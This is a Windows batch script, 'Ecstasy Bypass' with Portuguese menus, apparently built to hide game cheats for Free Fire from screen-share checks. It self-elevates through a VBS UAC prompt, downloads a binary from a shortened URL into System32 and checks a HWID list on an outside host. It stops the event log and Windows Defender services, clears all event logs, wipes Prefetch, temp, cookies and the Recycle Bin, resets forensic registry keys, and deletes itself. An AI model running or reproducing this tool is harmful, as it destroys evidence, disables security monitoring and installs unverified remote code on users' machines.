@echo off

setlocal
call :setESC

:setESC
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)
 goto jesuscristoamem

cls


:jesuscristoamem

@echo off
:Admin
title 
    if "processor_architecture" equ "amd64" (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

)

if '%errorlevel%' neq '0' (
color 0e
mode 40,3
echo.
title 
    goto getadmin
) else ( goto fadmin )

:GetAdmin
    echo set uac = createobject^("shell.application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""09
    echo uac.shellexecute "%~s0", "%params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "temp\getadmin.vbs"
    exit \b

:FAdmin
    pushd "%CD%"
    cd /d "%~dp0"
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

@shift /0
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::Downloads

:D
call :Z
cls
md %appdata%\Ecstasy
title Checking
mode 15,2
bitsadmin /transfer calcmyDownload /download /priority foreground https://tinyurl.com/t336x2j C:\Windows\System32\curl.exe >nul
cls

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::Hwid

:loading1

title %~n0
cls
curl -s http://hwiddominiouwu.atwebpages.com/hwid -o %appdata%\Ecstasy\hwid >nul
mode 45,8
echo.
echo.
echo. 
echo checking Hwid
echo press any key to continue
pause>nul
cls
timeout /T 1 > nul
FOR /F %%u IN ('powershell -NoLogo -NoProfile -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"') DO (SET "UUID=%%u") >nul
>nul findstr /c:"%UUID%" %appdata%\Ecstasy\hwid >nul && (
del /F %appdata%\Ecstasy\hwid && goto abas
)
echo.
color 4
echo GoodBye...
del /F %appdata%\Ecstasy\hwid
timeout /t 2 >nul
del %0
exit
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
goto Beg1inoffile
:ColorText
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1
goto eof
:Beginoffile
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:abas
cls
@echo off
chcp 65001>nul
mode 140,40
title Ecstasy Bypass - Coded by Dragonzera#0009
echo.                                                           %ESC%[34m`.-:/++++++++/:-.`%ESC%[0m                               
echo.                                                       %ESC%[34m`.:++++++++++++++++++++ :.`%ESC%[0m                           
echo.                                                     %ESC%[34m.:+++++++%ESC%[0m%ESC%[95m////////////%ESC%[0m%ESC%[34m+++++++:`%ESC%[0m                       
echo.                                                   %ESC%[34m`/o++++%ESC%[0m%ESC%[95m////////////////////%ESC%[0m%ESC%[34m++++o/`%ESC%[0m                        
echo.                                                  %ESC%[34m:o+++%ESC%[0m%ESC%[95m//////////////////////////%ESC%[0m%ESC%[34m+++o:%ESC%[0m                       
echo.                                                %ESC%[34m`/o++%ESC%[0m%ESC%[95m//////////////////////////////%ESC%[0m%ESC%[34m++o/`%ESC%[0m                     
echo.                                                %ESC%[34m+o++%ESC%[0m%ESC%[95m///////+ossso//////ossso+///////%ESC%[0m%ESC%[34m++o+%ESC%[0m                     
echo.                                               %ESC%[34m/o++%ESC%[0m%ESC%[95m////////ssoooso////osooosy////////%ESC%[0m%ESC%[34m++o/%ESC%[0m                    
echo.                                              %ESC%[34m`s++%ESC%[0m%ESC%[95m/////////osoooy+////+yoooso/////////%ESC%[0m%ESC%[34m++s`%ESC%[0m                   
echo.                                              %ESC%[34m/+++%ESC%[0m%ESC%[95m//////////+ooo////////ooo+//////////%ESC%[0m%ESC%[34m+++/%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m////////////////////////////////////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m///////osssssssssssssssssssso///////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34ms+++%ESC%[0m%ESC%[95m//////osooooooooooooooooooooso//////%ESC%[0m%ESC%[34m+++s%ESC%[0m                   
echo.                                              %ESC%[34myo++%ESC%[0m%ESC%[95m///////yooooooooooooooooooooy///////%ESC%[0m%ESC%[34m++oy%ESC%[0m                   
echo.                                              %ESC%[34msh+++%ESC%[0m%ESC%[95m//////+yooooooooooooooooooy+//////%ESC%[0m%ESC%[34m+++hs%ESC%[0m                   
echo.                                              %ESC%[34m/ss+++%ESC%[0m%ESC%[95m///////ssooooooooooooooss///////%ESC%[0m%ESC%[34m+++ss/%ESC%[0m                   
echo.                                              %ESC%[34m`yss+++%ESC%[0m%ESC%[95m///////+ossssoooosssso+///////%ESC%[0m%ESC%[34m+++ssy`%ESC%[0m                   
echo.                                               %ESC%[34m/sss+++%ESC%[0m%ESC%[95m/////////++oooooo++/////////%ESC%[0m%ESC%[34m+++sss/%ESC%[0m                    
echo.                                                %ESC%[34m+ssyo+++%ESC%[0m%ESC%[95m////////////////////////%ESC%[0m%ESC%[34m+++oyss+%ESC%[0m                     
echo.                                                %ESC%[34m`+sosso++++%ESC%[0m%ESC%[95m//////////////////%ESC%[0m%ESC%[34m++++ossos+%ESC%[0m                      
echo.                                                  %ESC%[34m:osossso++++++%ESC%[0m%ESC%[95m////////%ESC%[0m%ESC%[34m++++++osssoss:%ESC%[0m                       
echo.                                              %ESC%[34m     `/osoossssooo++++++++ ooossssooso/`      %ESC%[0m               
echo.                                                     ^ %ESC%[34m.:osoooossssssssssssssooosso:.%ESC%[0m                         
echo.                                                       ^ %ESC%[34m`.:+oosoooooooooooosooo/.`%ESC%[0m                           
echo.                                                           ^ %ESC%[34m`.-/++oooooo++/-.`%ESC%[0m                               
echo.                                                                                          %ESC%[4mCoded by Dragonzera#0009%ESC%[0m
echo.                                                               
echo.                                                    %ESC%[91m1. Bypass for Free Fire%ESC%[0m
echo.
echo.
echo.
set /p input= Escolha uma opcao: 
if %input%==1 goto Main2

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
cls
goto Main2
@shift /0
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:main88
:Main2
cls
chcp 65001>nul
mode 140,40
title Ecstasy Bypass - Coded by Dragonzera#0009
echo.                                                           %ESC%[34m`.-:/++++++++/:-.`%ESC%[0m                               
echo.                                                       %ESC%[34m`.:++++++++++++++++++++ :.`%ESC%[0m                           
echo.                                                     %ESC%[34m.:+++++++%ESC%[0m%ESC%[95m////////////%ESC%[0m%ESC%[34m+++++++:`%ESC%[0m                       
echo.                                                   %ESC%[34m`/o++++%ESC%[0m%ESC%[95m////////////////////%ESC%[0m%ESC%[34m++++o/`%ESC%[0m                        
echo.                                                  %ESC%[34m:o+++%ESC%[0m%ESC%[95m//////////////////////////%ESC%[0m%ESC%[34m+++o:%ESC%[0m                       
echo.                                                %ESC%[34m`/o++%ESC%[0m%ESC%[95m//////////////////////////////%ESC%[0m%ESC%[34m++o/`%ESC%[0m                     
echo.                                                %ESC%[34m+o++%ESC%[0m%ESC%[95m///////+ossso//////ossso+///////%ESC%[0m%ESC%[34m++o+%ESC%[0m                     
echo.                                               %ESC%[34m/o++%ESC%[0m%ESC%[95m////////ssoooso////osooosy////////%ESC%[0m%ESC%[34m++o/%ESC%[0m                    
echo.                                              %ESC%[34m`s++%ESC%[0m%ESC%[95m/////////osoooy+////+yoooso/////////%ESC%[0m%ESC%[34m++s`%ESC%[0m                   
echo.                                              %ESC%[34m/+++%ESC%[0m%ESC%[95m//////////+ooo////////ooo+//////////%ESC%[0m%ESC%[34m+++/%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m////////////////////////////////////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m///////osssssssssssssssssssso///////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34ms+++%ESC%[0m%ESC%[95m//////osooooooooooooooooooooso//////%ESC%[0m%ESC%[34m+++s%ESC%[0m                   
echo.                                              %ESC%[34myo++%ESC%[0m%ESC%[95m///////yooooooooooooooooooooy///////%ESC%[0m%ESC%[34m++oy%ESC%[0m                   
echo.                                              %ESC%[34msh+++%ESC%[0m%ESC%[95m//////+yooooooooooooooooooy+//////%ESC%[0m%ESC%[34m+++hs%ESC%[0m                   
echo.                                              %ESC%[34m/ss+++%ESC%[0m%ESC%[95m///////ssooooooooooooooss///////%ESC%[0m%ESC%[34m+++ss/%ESC%[0m                   
echo.                                              %ESC%[34m`yss+++%ESC%[0m%ESC%[95m///////+ossssoooosssso+///////%ESC%[0m%ESC%[34m+++ssy`%ESC%[0m                   
echo.                                               %ESC%[34m/sss+++%ESC%[0m%ESC%[95m/////////++oooooo++/////////%ESC%[0m%ESC%[34m+++sss/%ESC%[0m                    
echo.                                                %ESC%[34m+ssyo+++%ESC%[0m%ESC%[95m////////////////////////%ESC%[0m%ESC%[34m+++oyss+%ESC%[0m                     
echo.                                                %ESC%[34m`+sosso++++%ESC%[0m%ESC%[95m//////////////////%ESC%[0m%ESC%[34m++++ossos+%ESC%[0m                      
echo.                                                  %ESC%[34m:osossso++++++%ESC%[0m%ESC%[95m////////%ESC%[0m%ESC%[34m++++++osssoss:%ESC%[0m                       
echo.                                              %ESC%[34m     `/osoossssooo++++++++ ooossssooso/`      %ESC%[0m               
echo.                                                     ^ %ESC%[34m.:osoooossssssssssssssooosso:.%ESC%[0m                         
echo.                                                       ^ %ESC%[34m`.:+oosoooooooooooosooo/.`%ESC%[0m                           
echo.                                                           ^ %ESC%[34m`.-/++oooooo++/-.`%ESC%[0m                               
echo.                                                                                          %ESC%[4mCoded by Dragonzera#0009%ESC%[0m
echo.                                                               
echo.                                                    %ESC%[34m1. Enable Bypass For .exe%ESC%[0m
echo.                                                    %ESC%[36m2. Enable Bypass for .tmp%ESC%[0m
echo.                                                    %ESC%[35m3. Bypass Scanners%ESC%[0m
echo.                                                    %ESC%[32m4. Crash HD-Player%ESC%[0m
echo.                                                    %ESC%[33m5. Credits%ESC%[0m
echo.                                                    %ESC%[97m6. Exit And delete%ESC%[0m
set /p input= Escolha uma opcao: 
if %input%==1 goto bexe
if %input%==2 goto bypasstempff
if %input%==3 goto admin8
if %input%==4 goto crashs
if %input%==5 goto credits
if %input%==6 goto saidinha
::::::::::::::::::::::::::
if not exist %input% (
  echo invalid option
  timeout /t 2 >nobreak
  cls
  goto Main2
)
::::::::::::::::::::::::::


REM Sistema de bypass para scanners
:Admin8
@echo off
cls
mode 60,30
title Ecstasy Bypass - Coded by Dragonzera#0009
echo. %ESC%[36m
echo.
echo.                  .-//++++//-.                  
echo.               -/++++//////++++/-               
echo.              -+++//////////////+++-              
echo.             /++/////+//////+/////++/             
echo.            /++////+oos+//+soo+////++/            
echo.           .o+/////+sss+//+sss+/////+o.           
echo.           /++///////+//////+///////++/           
echo.           /++////oooooooooooooo////++/           
echo.           o++////soooooooooooos////++o           
echo.           +s+////+soooooooooos+////+s+           
echo.           .so+/////+oossssoo+/////+os.           
echo.            /ss++//////++++//////++ss/            
echo.             /ssoo++//////////++ooss/             
echo.              -+sssoo++++++++oosss+-              
echo.               `-+oosooossooosoo+-               
echo.                  `.:/++oo++/:.                  
echo.
time
sc stop eventlog >nul
tskill explorer
sc stop dps >nul
sc stop pcasvc >nul
sc stop diagtrack >nul
sc stop WinDefend >nul
sc stop sysmain >nul
sc start dps >nul
sc start pcasvc >nul
sc start diagtrack >nul
sc start WinDefend >nul
sc start sysmain >nul
sc start eventlog >nul
time
echo.
echo.
echo.
echo.
echo.
echo  %ESC%[33mPressione Algum Tecla tecla.%ESC%[0m
pause>nul
cls
goto Main2

:clr
@echo off
cls
title Clear Coded for Dragonzera#0009

:tmp
cls
ping localhost -n 5 >nul
cls
cls
goto tp

:tp
del /s /f /q %temp%
rd /s /q %temp%
cls

:pf
cls
ping localhost -n 5 >nul
cls
cls
goto pff

:pff
del /s /f /q C:\Windows\Prefetch
rd /s /q C:\Windows\Prefech

deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
cls
echo.        %ESC%[92mSucess!!!%ESC%[0m
echo.
goto clr2
:clr2
cls
echo.
color z
del *.log /a /s /q /f
/s /f /q c:\windows\temp\*.*
rd /s /q c:\windows\temp
md c:\windows\temp
del /s /f /q C:\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
rd /s /q %temp%
md %temp%
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
del c:\WIN386.SWP
cls
FOR /F "tokens=1, 2 * " %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access)goto noAdmin
for /F " tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
goto theEnd
:do_clear
echo clearing %1
wevtutil.exe cl %1
goto eof
:noAdmin
cls
:Lixeira
cls
echo.
pause
cls
rd /s /q %systemdrive%\$Recycle.bin
echo.
echo %ESC%[92mSucess!%ESC%[0m
cls
goto saidinha
:bexe
goto main4
:main4
cls
mode 140,40
title Ecstasy Bypass To .EXE - Coded by Dragonzera#0009
color 05
echo.                                                           %ESC%[34m`.-:/++++++++/:-.`%ESC%[0m                               
echo.                                                       %ESC%[34m`.:++++++++++++++++++++ :.`%ESC%[0m                           
echo.                                                     %ESC%[34m.:+++++++%ESC%[0m%ESC%[95m////////////%ESC%[0m%ESC%[34m+++++++:`%ESC%[0m                       
echo.                                                   %ESC%[34m`/o++++%ESC%[0m%ESC%[95m////////////////////%ESC%[0m%ESC%[34m++++o/`%ESC%[0m                        
echo.                                                  %ESC%[34m:o+++%ESC%[0m%ESC%[95m//////////////////////////%ESC%[0m%ESC%[34m+++o:%ESC%[0m                       
echo.                                                %ESC%[34m`/o++%ESC%[0m%ESC%[95m//////////////////////////////%ESC%[0m%ESC%[34m++o/`%ESC%[0m                     
echo.                                                %ESC%[34m+o++%ESC%[0m%ESC%[95m///////+ossso//////ossso+///////%ESC%[0m%ESC%[34m++o+%ESC%[0m                     
echo.                                               %ESC%[34m/o++%ESC%[0m%ESC%[95m////////ssoooso////osooosy////////%ESC%[0m%ESC%[34m++o/%ESC%[0m                    
echo.                                              %ESC%[34m`s++%ESC%[0m%ESC%[95m/////////osoooy+////+yoooso/////////%ESC%[0m%ESC%[34m++s`%ESC%[0m                   
echo.                                              %ESC%[34m/+++%ESC%[0m%ESC%[95m//////////+ooo////////ooo+//////////%ESC%[0m%ESC%[34m+++/%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m////////////////////////////////////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m///////osssssssssssssssssssso///////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34ms+++%ESC%[0m%ESC%[95m//////osooooooooooooooooooooso//////%ESC%[0m%ESC%[34m+++s%ESC%[0m                   
echo.                                              %ESC%[34myo++%ESC%[0m%ESC%[95m///////yooooooooooooooooooooy///////%ESC%[0m%ESC%[34m++oy%ESC%[0m                   
echo.                                              %ESC%[34msh+++%ESC%[0m%ESC%[95m//////+yooooooooooooooooooy+//////%ESC%[0m%ESC%[34m+++hs%ESC%[0m                   
echo.                                              %ESC%[34m/ss+++%ESC%[0m%ESC%[95m///////ssooooooooooooooss///////%ESC%[0m%ESC%[34m+++ss/%ESC%[0m                   
echo.                                              %ESC%[34m`yss+++%ESC%[0m%ESC%[95m///////+ossssoooosssso+///////%ESC%[0m%ESC%[34m+++ssy`%ESC%[0m                   
echo.                                               %ESC%[34m/sss+++%ESC%[0m%ESC%[95m/////////++oooooo++/////////%ESC%[0m%ESC%[34m+++sss/%ESC%[0m                    
echo.                                                %ESC%[34m+ssyo+++%ESC%[0m%ESC%[95m////////////////////////%ESC%[0m%ESC%[34m+++oyss+%ESC%[0m                     
echo.                                                %ESC%[34m`+sosso++++%ESC%[0m%ESC%[95m//////////////////%ESC%[0m%ESC%[34m++++ossos+%ESC%[0m                      
echo.                                                  %ESC%[34m:osossso++++++%ESC%[0m%ESC%[95m////////%ESC%[0m%ESC%[34m++++++osssoss:%ESC%[0m                       
echo.                                              %ESC%[34m     `/osoossssooo++++++++ ooossssooso/`      %ESC%[0m               
echo.                                                     ^ %ESC%[34m.:osoooossssssssssssssooosso:.%ESC%[0m                         
echo.                                                       ^ %ESC%[34m`.:+oosoooooooooooosooo/.`%ESC%[0m                           
echo.                                                           ^ %ESC%[34m`.-/++oooooo++/-.`%ESC%[0m                               
echo.                                                                                          %ESC%[4mCoded by Dragonzera#0009%ESC%[0m
echo.                                                               
echo.                                                        %ESC%[33m1. Enable Bypass For .EXE%ESC%[0m
echo.                                                        %ESC%[93m2. Exit and delete%ESC%[0m
echo.
echo.
set /p input=%ESC%[4mEscolha uma opcao:%ESC%[0m 
if %input%==1 goto sim
if %input%==2 goto main88


:sim
cls
echo Escreva o nome do cheat. (Exemplo: cheat.exe)
set /p n=cheat: 
cls
echo Selecione o diretorio do cheat.
echo [ 1 ] Desktop
set /p is=Directory: 
if is == 1 cd C:\Users\%username%\Desktop
start C:\Users\%username%\Desktop\%n%
cls
echo Apos pedirem sua tela feche o %n% e aperte qualquer botao
pause >nul
goto regdelete1

:regdelete1
cls
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\7-Zip\FM" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\BagMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /f
reg DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
reg DELETE "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
reg DELETE "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
reg DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing" /f


reg add "HKEY_CURRENT_USER\SOFTWARE\7-Zip\FM" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\BagMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing" /f
cls
goto Admin8

:saidinha
@echo off
cls
:tmp
cls
ping localhost -n 5 >nul
cls
cls
goto tp

:tp
del /s /f /q %temp%
rd /s /q %temp%
cls

:pf
cls
ping localhost -n 5 >nul
cls
cls
goto pff

:pff
echo. %ESC%[91mAguarde Enquanto Limpamos o Sistema de Rastros.%ESC%[0m
del /s /f /q C:\Windows\Prefetch
rd /s /q C:\Windows\Prefech
cls
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
del c:\WIN386.SWP
cls
@echo off
cls
goto tmp
:tmp
cls
ping localhost -n 5 >nul
cls
cls
goto tp

:tp
del /s /f /q %temp%
rd /s /q %temp%
cls

:pf
cls
ping localhost -n 5 >nul
cls
cls
goto pff

:pff
del /s /f /q C:\Windows\Prefetch
rd /s /q C:\Windows\Prefech
cls
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
cls
msg * Agradeco Sua Preferencia Em Nossos Servicos.
start /b "" cmd /c del "%~f0"&exit /b

:bypasstempff
cls
echo Escreva o nome do cheat. (Exemplo: cheat.tmp)
set /p n=Cheat: 
cls
echo Selecione o diretorio do cheat.
echo [ 1 ] Temp
set /p is=Directory: 
if is == 1 cd C:\Users\%username%\AppData\Local\Temp
start C:\Users\%username%\AppData\Local\Temp\%n%
cls
echo Apos pedirem sua tela feche o %n% e aperte qualquer botao
pause >nul
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\7-Zip\FM" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\BagMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /f
reg DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
reg DELETE "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
reg DELETE "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
reg DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing" /f

reg add "HKEY_CURRENT_USER\SOFTWARE\7-Zip\FM" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\BagMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing" /f
cls
goto :Admin8

:credits
mode 140,40
title Ecstasy Bypass - Coded by Dragonzera#0009
echo.                                                           %ESC%[34m`.-:/++++++++/:-.`%ESC%[0m                               
